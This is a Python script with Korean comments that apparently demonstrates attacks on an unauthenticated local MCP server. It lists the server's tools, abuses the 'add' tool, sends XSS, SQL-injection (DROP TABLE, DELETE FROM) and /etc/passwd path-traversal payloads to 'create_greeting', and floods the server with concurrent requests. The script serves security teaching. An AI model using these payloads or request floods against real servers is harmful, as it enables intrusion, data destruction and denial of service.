# asyncio 라이브러리를 임포트하여 비동기 작업을 지원합니다.
import asyncio
# fastmcp 라이브러리에서 Client 클래스를 임포트하여 MCP 서버에 연결합니다.
from fastmcp import Client

# 비동기 함수로 공격 시뮬레이션을 정의합니다.
async def simulate_attack():
    """공격자가 인증 없이 HTTP MCP 서버에 접근하는 시나리오를 시뮬레이션합니다."""
    
    # 로컬호스트의 8000번 포트에서 실행 중인 MCP 서버의 http 전송용 엔드포인트 URL을 사용하여 클라이언트를 생성합니다.
    # 이 클라이언트는 공격자가 서버에 직접 접근하는 것을 시뮬레이션합니다.
    client = Client("http://127.0.0.1:8000/mcp")
    
    try:
        # client 컨텍스트 매니저를 사용하여 서버와의 연결을 관리합니다.
        async with client:
            # 공격 시뮬레이션 시작을 알리는 메시지를 출력합니다.
            print("🚨 공격 시뮬레이션 시작 🚨\n")
            print("공격자가 HTTP MCP 서버에 무단 접근을 시도합니다...")
            
            # 서버에 ping을 보내 연결 상태를 확인합니다.
            await client.ping()
            # 서버 연결이 성공했음을 알리고, 인증 없이 접근이 가능함을 경고합니다.
            print("✅ 서버 연결 성공! (인증 없이 접근 가능)")
            
            # 서버에서 사용 가능한 도구 목록을 가져옵니다. 이는 공격자가 시스템을 정찰하는 단계입니다.
            tools = await client.list_tools()
            print(f"\n🔍 발견된 도구들 ({len(tools)}개):")
            # 발견된 각 도구의 이름과 설명을 출력합니다.
            for tool in tools:
                print(f"  - {tool.name}: {tool.description}")
            
            # 공격자가 모든 도구에 제한 없이 접근할 수 있는 상태임을 경고합니다.
            print("\n⚠️  공격자가 모든 도구에 무제한 접근 가능!")
            
            # 1단계: 정상적인 기능을 악용하여 서버에 부하를 줍니다.
            print("\n📊 1단계: 정상 기능 남용")
            # 'add' 도구를 5번 호출하여 큰 숫자를 더하게 함으로써 서버 리소스를 소모시킵니다.
            for i in range(5):
                result = await client.call_tool("add", {"a": 999999, "b": 999999})
                print(f"  악용된 계산 {i+1}: {result}")
            
            # 2단계: 악의적인 입력을 시도하여 시스템의 취약점을 탐색합니다.
            print("\n💀 2단계: 악의적인 입력 시도")
            # XSS, SQL 인젝션, 경로 탐색 등 다양한 공격 벡터를 시도합니다.
            malicious_names = [
                "<script>alert('XSS')</script>",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "admin'; DELETE FROM *; --"
            ]
            
            # 각 악성 입력에 대해 'create_greeting' 도구를 호출합니다.
            for name in malicious_names:
                try:
                    result = await client.call_tool("create_greeting", {"name": name})
                    print(f"  악의적 입력 시도: {name[:30]}...")
                    print(f"  서버 응답: {result}")
                # 서버에서 예외가 발생하면 입력이 차단되었음을 의미할 수 있습니다.
                except Exception as e:
                    print(f"  입력 차단됨: {e}")
            
            # 3단계: 서비스 거부(DoS) 공격을 시도하여 서버 리소스를 고갈시킵니다.
            print("\n🔥 3단계: 리소스 고갈 공격 (DoS)")
            print("  연속으로 대량 요청 전송 중...")
            
            # 20개의 'add' 도구 호출 작업을 동시에 생성합니다.
            tasks = []
            for i in range(20):
                task = client.call_tool("add", {"a": i*100000, "b": i*100000})
                tasks.append(task)
            
            # 생성된 모든 작업을 비동기적으로 실행하고 결과를 수집합니다.
            results = await asyncio.gather(*tasks, return_exceptions=True)
            # 성공적으로 처리된 요청의 수를 계산합니다.
            success_count = sum(1 for r in results if not isinstance(r, Exception))
            # 서버가 모든 동시 요청을 처리했음을 확인합니다.
            print(f"  {success_count}/{len(tasks)} 요청 성공 - 서버가 모든 요청을 처리함!")
            
            # 최종 공격 결과를 요약하여 출력합니다.
            print("\n🎯 공격 결과:")
            print("  ✅ 인증 없이 모든 기능에 접근 가능")
            print("  ✅ 악의적인 입력 주입 시도 가능")
            print("  ✅ 서버 리소스 무제한 사용 가능")
            print("  ⚠️  보안 취약점 확인!")
            
    # 서버 연결 실패 등 예외 발생 시 처리합니다.
    except Exception as e:
        print(f"❌ 공격 실패: {e}")
        print("HTTP 서버가 실행 중인지 확인하세요.")
        print("실행 명령: python http_server.py")

# 이 스크립트가 직접 실행될 때 main 로직을 수행합니다.
if __name__ == "__main__":
    # 비동기 함수인 simulate_attack을 실행합니다.
    asyncio.run(simulate_attack())
